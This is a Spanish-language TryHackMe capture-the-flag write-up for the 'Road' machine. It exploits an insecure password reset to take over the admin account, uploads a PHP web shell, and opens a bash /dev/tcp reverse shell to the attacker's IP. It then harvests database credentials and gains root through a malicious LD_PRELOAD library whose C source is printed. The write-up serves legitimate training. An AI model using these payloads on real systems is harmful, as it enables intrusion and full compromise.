## TryHackMe  <> Road
![image](https://github.com/Esevka/CTF/assets/139042999/d30b89d8-4160-4311-a686-1299c32d9edd)

Enunciado Informacion : Obtener user.txt y root.txt

---
---

## Escaneo de puertos

Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64 podriamos decir que es una maquina Linux.
  
    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/road]
    └─# ping -c1 10.10.121.4
    PING 10.10.121.4 (10.10.121.4) 56(84) bytes of data.
    64 bytes from 10.10.121.4: icmp_seq=1 ttl=63 time=561 ms
    
    --- 10.10.121.4 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 560.987/560.987/560.987/0.000 ms
    
Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.121.4 -oN open_ports                                                    
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 19:04 CEST
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63
    
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
    └─# nmap -p 22,80 -sCV 10.10.121.4 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 19:05 CEST
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e6dc8869dea1738e845ba13e279f0724 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
    |   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
    |   256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
    |_http-title: Sky Couriers
    | http-methods: 
    |_  Supported Methods: HEAD GET POST OPTIONS
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Analisis de vulnerabilidaddes en los servicios y explotacion de vulnerabilidades.

Segun el launchpad del servicio OpenSSH que esta corriento en el puerto 22 y el ttl obtenido anteriormente pordriamos decir que estamos delante de una maquina.

![image](https://github.com/Esevka/CTF/assets/139042999/65cbd52b-a395-4794-80d1-6b7874ca7fd8)

-- Puerto 80

  Cargamos la web y no encontramos nada interesante por lo que vamos a empezar con un poco de fuzzing a ver si encontramos algunos directorios interesantes.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
    └─# gobuster dir -u http://10.10.121.4/ -w /usr/share/wordlists/dirb/common.txt -o ../fuzz
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    /.htaccess            (Status: 403) [Size: 276]
    /.hta                 (Status: 403) [Size: 276]
    /.htpasswd            (Status: 403) [Size: 276]
    /assets               (Status: 301) [Size: 311] [--> http://10.10.121.4/assets/] ---> Nada interesante
    /index.html           (Status: 200) [Size: 19607]
    /phpMyAdmin           (Status: 301) [Size: 315] [--> http://10.10.121.4/phpMyAdmin/] ---> No tenemos credenciales 
    /server-status        (Status: 403) [Size: 276]
    /v2                   (Status: 301) [Size: 307] [--> http://10.10.121.4/v2/]

  Volvemos a fuzzear el directorio v2 a ver si encontramos algo.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
    └─# gobuster dir -u http://10.10.121.4/v2/ -w /usr/share/wordlists/dirb/common.txt -o ../fuzz1
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    /.hta                 (Status: 403) [Size: 276]
    /.htaccess            (Status: 403) [Size: 276]
    /.htpasswd            (Status: 403) [Size: 276]
    /admin                (Status: 301) [Size: 313] [--> http://10.10.121.4/v2/admin/]
    /index.php            (Status: 302) [Size: 20178] [--> /v2/admin/login.html]

  Encontramos un directorio (http://10.10.121.4/v2/admin/login.html) en el que podemos hacer login o crear una cuenta en la aplicacion, por lo que vamos a crearnos una cuenta y seguidamente loguearnos en el sistema.

  ![image](https://github.com/Esevka/CTF/assets/139042999/b60ba7ce-4832-4e47-8fe0-639c1889a25a)

  Despues de revisar el entorno al que accedemos al loguearnos en la aplicacion, solo encontramos dos apartados interesantes.

  1) Nos permite cambiar la clave del usuario con el que estamos logueado ---> http://10.10.121.4/v2/ResetUser.php
  2) Nos permite subir una imagen de nuestro profile, pero solo el admin(admin@sky.thm) tiene permiso ---> http://10.10.121.4/v2/profile.php

![image](https://github.com/Esevka/CTF/assets/139042999/e5d67141-11e6-427a-b6be-144fedd9c6f8)

Analizando los apartados vemos que tras interceptar la request con burpsuite podemos manipular ciertos valores a la hora de cambiar la clave del usuario, ya que no existe token csrf(no controla el usuario autenticado)

	POST /v2/lostpassword.php HTTP/1.1
	Host: 10.10.121.4
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Content-Type: multipart/form-data; boundary=---------------------------227160023612690920091670948221
	Content-Length: 660
	Origin: http://10.10.121.4
	Connection: close
	Referer: http://10.10.121.4/v2/ResetUser.php
	Cookie: PHPSESSID=har274pebitf05fieavapumrf2; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
	Upgrade-Insecure-Requests: 1
	
	-----------------------------227160023612690920091670948221
	Content-Disposition: form-data; name="uname"
	
	esevka@esevka.com
	-----------------------------227160023612690920091670948221
	Content-Disposition: form-data; name="npass"
	
	esevka
	-----------------------------227160023612690920091670948221
	Content-Disposition: form-data; name="cpass"
	
	esevka
	-----------------------------227160023612690920091670948221
	Content-Disposition: form-data; name="ci_csrf_token"
 
	-----------------------------227160023612690920091670948221
	Content-Disposition: form-data; name="send"
	
	Submit
	-----------------------------227160023612690920091670948221--
 
 Cambiamos nuestro correo esevka@esevka.com por el correo del admin(admin@sky.thm) y enviamos la request.

	HTTP/1.1 200 OK
	Date: Mon, 31 Jul 2023 17:52:21 GMT
	Server: Apache/2.4.41 (Ubuntu)
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	refresh: 3;url=ResetUser.php
	Content-Length: 37
	Connection: close
	Content-Type: text/html; charset=UTF-8
	
	Password changed. 
	Taking you back...

Como vemos el cambia se ha realizado hacemos un logout y nos logueamos como admin.

![image](https://github.com/Esevka/CTF/assets/139042999/577062b7-c2e0-46f5-92d9-37bf0325b962)

Entramos en el apartado profile donde nos deja subir una imagen para nuestro perfil ya que estamos logueados como el usuario admin(admin@sky.thm), en vez de una imagen subimos un fichero rce.php 

![image](https://github.com/Esevka/CTF/assets/139042999/573182e0-c3b8-4cd5-bdd2-939727395b23)

 Contenido del fichero rce.php

 	<?php
  	system($_GET['cmd']);
  	?>


Tras subir el fichero rce.php obtenemos un Response 200 OK

	HTTP/1.1 200 OK
	Date: Mon, 31 Jul 2023 18:15:38 GMT
	Server: Apache/2.4.41 (Ubuntu)
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	Vary: Accept-Encoding
	Content-Length: 26802
	Connection: close
	Content-Type: text/html; charset=UTF-8
	
	Image saved.<!DOCTYPE html>	
---
Problema: No sabemos en que ruta se almacena el fichero que acabamos de subir.
---

Despues de un buen rato buscando encontramos una url comentada en el codigo de la Respuesta que nos da el servidor cuando subimos una imagen para nuestro profile.

![image](https://github.com/Esevka/CTF/assets/139042999/d9e15b42-55db-4cdb-8d59-501a5978fe7b)

Bingo en esa url se encuentra nuestro rce.php desde el cual podemos ejecutar comandos en la maquina victima.
![image](https://github.com/Esevka/CTF/assets/139042999/3ff53da0-1c68-46ab-b8fe-8b9f5ac81ae6)


## Obtenemos Reverse Shell

Url que nos permite obtener una reverse shell en la maquina victima, para que funcione la shell debe estar url encodeada para que los caracteres no den problemas.

	http://10.10.121.4/v2/profileimages/rce.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.18.54.226%2F1988%200%3E%261'

Nos ponemos en escucha en nuestra maquina y ejecutamos la url anterior.

	┌──(root㉿kali)-[/home/kali/Desktop/ctf/road]
	└─# nc -lnvp 1988                                     
	listening on [any] 1988 ...
	connect to [10.18.54.226] from (UNKNOWN) [10.10.121.4] 52740
	bash: cannot set terminal process group (561): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@sky:/var/www/html/v2/profileimages$ id
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	www-data@sky:/var/www/html/v2/profileimages$ 

  Upgradeamos la shell para obtener una full tty

	www-data@sky:/var/www/html/v2/profileimages$ SHELL=/bin/bash script -q /dev/null
	</profileimages$ SHELL=/bin/bash script -q /dev/null
 
	www-data@sky:/var/www/html/v2/profileimages$ ^Z
	zsh: suspended  nc -lnvp 1988
	                                                                                                                                   
	┌──(root㉿kali)-[/home/kali/Desktop/ctf/road]
	└─# stty raw -echo && fg
	[1]  + continued  nc -lnvp 1988
	
	www-data@sky:/var/www/html/v2/profileimages$ export TERM=xterm-256color
 
	www-data@sky:/var/www/html/v2/profileimages$ stty rows 42 columns 131

Confirmamos distribucion y serie de la maquina

	 www-data@sky:/home/webdeveloper$ lsb_release -a
	No LSB modules are available.
	Distributor ID: Ubuntu
	Description:    Ubuntu 20.04.2 LTS
	Release:        20.04
	Codename:       focal


## Post Explotacion Escalada de privilegios www-data to webdeveloper.

Obtenemos la flag user.txt
 
	www-data@sky:/home/webdeveloper$ cat user.txt
	63191e4ece3752[...]62a5e64d45

Credenciales phpMyAdmin(nos permite loguearnos, no hay nada interesante en la base de datos)

	www-data@sky:/var/www/html/v2$ cat lostpassword.php 

	$con = mysqli_connect('localhost','root','ThisIsSecurePassword!');

Revisando el fichero crontab encontre en el directorio /etc un fichero interesante ----- mongod.conf ----

 	Contenido del fichero

	   	www-data@sky:/etc$ cat mongod.conf 
		# mongod.conf
		
		# for documentation of all options, see:
		#   http://docs.mongodb.org/manual/reference/configuration-options/
		
		# Where and how to store data.
		storage:
		  dbPath: /var/lib/mongodb
		  journal:
		    enabled: true
		#  engine:
		#  mmapv1:
		#  wiredTiger:
		
		# where to write logging data.
		systemLog:
		  destination: file
		  logAppend: true
		  path: /var/log/mongodb/mongod.log
		
		# network interfaces
		net:
		  port: 27017
		  bindIp: 127.0.0.1

Segun la info obtenida supuestamente esta corriendo un servicio mongodb en el localhost de la maquina en el puerto 27017, lo verificamos.

	www-data@sky:/etc$ ss -tunlp
	Netid       State        Recv-Q       Send-Q                Local Address:Port               Peer Address:Port       Process                             
	tcp         LISTEN       0            4096                      127.0.0.1:27017                   0.0.0.0:*                        
	tcp         LISTEN       0            151                       127.0.0.1:3306                    0.0.0.0:*                        

Nos conectamos al servidor de bases de datos MongoDB

	www-data@sky:/etc$ mongo
 
	MongoDB shell version v4.4.6
	connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
	Implicit session: session { "id" : UUID("984b273b-07ad-4a37-a79f-fe4c0def947e") }
	MongoDB server version: 4.4.6
	Welcome to the MongoDB shell.
	For interactive help, type "help".
 	[...]

Listamos las bases de datos (Despues de revisar la bases de datos la que nos interesa es backup.)

	> show dbs
	admin   0.000GB
	backup  0.000GB
	config  0.000GB
	local   0.000GB


Seleccionamos la bd y mostramos las tables.

	> use backup
	switched to db backup
 
	> show collections
	collection
	user
 
Mostramos el contenido de user y como podemos ver encontramos unas credenciales para el usuario webdeveloper

	> db.user.find()
	{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "Baha-----123!@#" }


Utilizamos las credenciales encontradas para finalizar la escalada horizontal hacia el usuario webdeveloper, lo podemos hacer por el servicio ssh o con el comando su como mas nos guste.

	www-data@sky:/etc$ su webdeveloper
	Password: 
	webdeveloper@sky:/etc$ 


	 ──(root㉿kali)-[/home/kali/Desktop/ctf/road]
	└─# ssh webdeveloper@10.10.121.4
	The authenticity of host '10.10.121.4 (10.10.121.4)' can't be established.
	[...]
	Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
	webdeveloper@sky:~$ 

## Post Explotacion Escalada de privilegios webdeveloper to root.

Listamos los comandos que nos estan permitidos ejecutar como root.

	webdeveloper@sky:~$ sudo -l
 
	Matching Defaults entries for webdeveloper on sky:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
	    env_keep+=LD_PRELOAD
	
	User webdeveloper may run the following commands on sky:
	    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility


Tras analizar todos los parametros vemos que a traves ded LD_PRELOAD podemos ganar acceso como root.

INFO: 

	env_reset: Este parámetro se utiliza para restablecer la variable de entorno.

	mail_badpass: Es el mensaje que se muestra al usuario si ingresa una contraseña incorrecta.

	secure_path: Es el entorno de ruta configurado para todos los comandos sudo. Un usuario no puede reescribir su propia ruta para ejecutar el comando sudo y obtener potencialmente una escalada de privilegios.

  	env_keep: Permite definir las variables de entorno que se conservarán en el entorno del usuario cuando la opción “env_reset” esté activada 

 	LD_PRELOAD: Es una variable de entorno de uso opcional. Contiene una o más rutas a bibliotecas u objetos compartidos que tendrán más prioridad que las ubicadas en las rutas estándar, incluida la biblioteca de tiempo de ejecución de C (libc.so). A esta funcionalidad se le denomina precargar librerías.

  Escalada de privilegios con sudo / env_keep / LD_PRELOAD ---> https://www.busindre.com/escalada_de_privilegios_con_variable_ld_preload

Elevamos privilegios y mostramos flag root.txt

Creamos un fichero shell.c con el siguiente codigo.

	webdeveloper@sky:/tmp$ cat shell.c 
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	void _init()
	{
	        unsetenv("LD_PRELOAD");
	
	        setuid(0);
	        system("/bin/bash");
	}
 
Compilamos dicho fichero y lo exportamos como un binario llamado shell.so

	webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
	shell.c: In function ‘_init’:
	shell.c:8:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
	    8 |  setuid(0);
	      |  ^~~~~~
Listamos los comandos que podemos ejecutar como root, ya que se me habia olvidado.

	webdeveloper@sky:/tmp$ sudo -l
	Matching Defaults entries for webdeveloper on sky:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
	    env_keep+=LD_PRELOAD
	
	User webdeveloper may run the following commands on sky:
	    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
     
Ejecutamos como sudo la precarga de nuestra libreria compartida y le pasamos el comando a ejecutar en este caso el que se nos esta permitido ejecutar como root sky_backup_utility.

	webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility 
	
	root@sky:~# cat root.txt 
	3a62d897c40a815ec---------df2f533ac6 


---
---> Maquina Road completa. <---
---
---
	

